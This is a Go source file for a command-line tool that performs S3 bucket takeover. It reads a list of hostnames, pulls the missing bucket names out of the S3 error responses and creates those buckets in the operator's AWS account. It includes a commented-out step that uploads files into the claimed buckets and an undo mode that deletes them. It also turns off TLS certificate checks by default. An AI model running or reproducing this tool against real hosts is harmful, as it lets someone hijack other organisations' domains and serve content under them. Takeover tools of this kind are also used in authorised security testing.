package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/xml"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"

	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/service/s3"
)

// AWS functions

type S3CreateBucketAPI interface {
	CreateBucket(ctx context.Context,
		params *s3.CreateBucketInput,
		optFns ...func(*s3.Options)) (*s3.CreateBucketOutput, error)
}

func MakeBucket(c context.Context, api S3CreateBucketAPI, input *s3.CreateBucketInput) (*s3.CreateBucketOutput, error) {
	return api.CreateBucket(c, input)
}

type S3DeleteBucketAPI interface {
	DeleteBucket(ctx context.Context,
		params *s3.DeleteBucketInput,
		optFns ...func(*s3.Options)) (*s3.DeleteBucketOutput, error)
}

func RemoveBucket(c context.Context, api S3DeleteBucketAPI, input *s3.DeleteBucketInput) (*s3.DeleteBucketOutput, error) {
	return api.DeleteBucket(c, input)
}

type S3PutObjectAPI interface {
	PutObject(ctx context.Context,
		params *s3.PutObjectInput,
		optFns ...func(*s3.Options)) (*s3.PutObjectOutput, error)
}

func PutFile(c context.Context, api S3PutObjectAPI, input *s3.PutObjectInput) (*s3.PutObjectOutput, error) {
	return api.PutObject(c, input)
}

//Functionalities
type ErrorXMLs3 struct {
	XMLName    xml.Name `xml:"Error"`
	Text       string   `xml:",chardata"`
	Code       string   `xml:"Code"`
	Message    string   `xml:"Message"`
	BucketName string   `xml:"BucketName"`
	RequestId  string   `xml:"RequestId"`
	HostId     string   `xml:"HostId"`
}

func fileRead(fileLocation string) []string {
	fileContent, err := os.Open(fileLocation)
	if err != nil {
		log.Default().Fatalf("Failed to open the bucket list")
	}
	scanner := bufio.NewScanner(fileContent)
	scanner.Split(bufio.ScanLines)
	var urlist []string

	for scanner.Scan() {
		urlist = append(urlist, scanner.Text())
	}
	fileContent.Close()

	return urlist
}

func getContent(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("GET error: %v", err)
	}
	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read body: %v", err)
	}

	return data, nil
}

func main() {

	// var individualBucket string

	listFile := flag.String("l", "", "Path to s3 bucket list")
	regionStr := flag.String("r", "", "Region for the s3 buckets")
	//templatePath := flag.String("t", "", "Path to template")
	insecureTLS := flag.Bool("k", true, "When used skip certificate check")
	directiveStr := flag.String("m", "", "Perform s3 takeover")

	flag.Parse()
	//Template variables

	//AWS Session configuration

	cfg, err := config.LoadDefaultConfig(
		context.Background(),
		config.WithRegion(*regionStr),
		config.WithSharedConfigProfile("sso"),
	)
	if err != nil {
		log.Fatalf("unable to load SDK config, %v", err)
	}

	// Deactivate certificate check
	if *insecureTLS {
		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}

	fmt.Println(directiveStr)
	switch {
	case *directiveStr == "tko":

		fmt.Println("Debug 1")

		f, err := os.Create("data.txt")
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()

		var result ErrorXMLs3
		client := s3.NewFromConfig(cfg)

		for _, each_line := range fileRead(*listFile) {
			if xmlBytes, err := getContent("https://" + each_line); err != nil {
				log.Printf("Failed to get XML: %v", err)
			} else {

				xml.Unmarshal(xmlBytes, &result)

				input := &s3.CreateBucketInput{
					Bucket: &result.BucketName,
				}

				_, err = MakeBucket(context.TODO(), client, input)
				if err != nil {
					fmt.Println("Could not create bucket " + result.BucketName)
				}
				_, err2 := f.WriteString(result.BucketName + "\n")
				if err2 != nil {
					log.Fatal(err2)
				}

				//Upload files
				/*
					if templatePath != nil {
						var filename string
						directorio := *templatePath

						files, err := ioutil.ReadDir(directorio)
						if err != nil {
							log.Fatal(err)
						}
						for _, f := range files {

							filename = f.Name()
							file, err := os.Open(directorio + filename)
							if err != nil {
								fmt.Println("Unable to open file " + filename)
								return
							}

							input := &s3.PutObjectInput{
								Bucket: &result.BucketName,
								Key:    &filename,
								Body:   file,
							}

							_, err = PutFile(context.TODO(), client, input)
							if err != nil {
								fmt.Println("Got error uploading file:")
								fmt.Println(err)
								return
							}

						}
					}
				*/
			}

		}
		fmt.Println("Debug 2")

	case *directiveStr == "undo":

		client := s3.NewFromConfig(cfg)

		for _, each_line := range fileRead("./data.txt") {
			input := &s3.DeleteBucketInput{
				Bucket: &each_line,
			}

			_, err = RemoveBucket(context.TODO(), client, input)
			if err != nil {
				fmt.Println("Could not delete bucket " + *input.Bucket)
			}

		}

	}
}
